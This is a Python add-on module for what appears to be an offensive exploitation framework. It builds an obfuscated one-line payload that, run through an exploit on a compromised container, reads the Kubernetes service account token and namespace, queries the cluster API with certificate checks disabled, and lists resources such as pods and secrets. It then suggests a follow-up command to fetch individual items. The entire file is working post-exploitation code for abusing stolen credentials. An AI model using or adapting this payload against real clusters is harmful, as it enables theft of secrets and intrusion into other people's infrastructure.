import json

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    if not params or len(params) < 1:
        print(f" {R}!!{N} Usage: --addon k8s_list <resource> [namespace]")
        return

    target_res = params[0] # e.g., pods, secrets, configmaps
    target_ns = params[1] if len(params) > 1 else None
    
    ns_display = target_ns if target_ns else "LOCAL"
    ns_logic = f"'{target_ns}'" if target_ns else "open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip()"

    print(f"\n{B}[ K8S EXPLORER: LIST {C}{target_res.upper()}{B} in {C}{ns_display}{B} ]{N}")

    payload = (
        f"(lambda ns, res, token: (lambda conn: (conn.request('GET', f'/api/v1/namespaces/{{ns}}/{{res}}', "
        f"headers={{'Authorization': 'Bearer ' + token}}), "
        f"conn.getresponse().read().decode())[1])"
        f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
        f"({ns_logic}, '{target_res}', open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip())"
    )

    result = exploit.execute(payload)
    try:
        data = json.loads(result)
        if data.get("kind") == "Status":
            print(f" {R}!!{N} API ERROR: {data.get('message')}")
            return

        items = data.get('items', [])
        print(f"FOUND {len(items)} {target_res.upper()}(S):")
        for item in items:
            print(f" {G}●{N} {item['metadata']['name']}")
            
        if items:
            hint_ns = f" {target_ns}" if target_ns else ""
            print(f"\n {Y}Try: --addon k8s_get {target_res} {items[0]['metadata']['name']}{hint_ns}{N}")
    except:
        print(f" {R}!!{N} List failed. API Response: {result[:200]}")
    print(f"\n{B}[ Operation Complete ]{N}\n")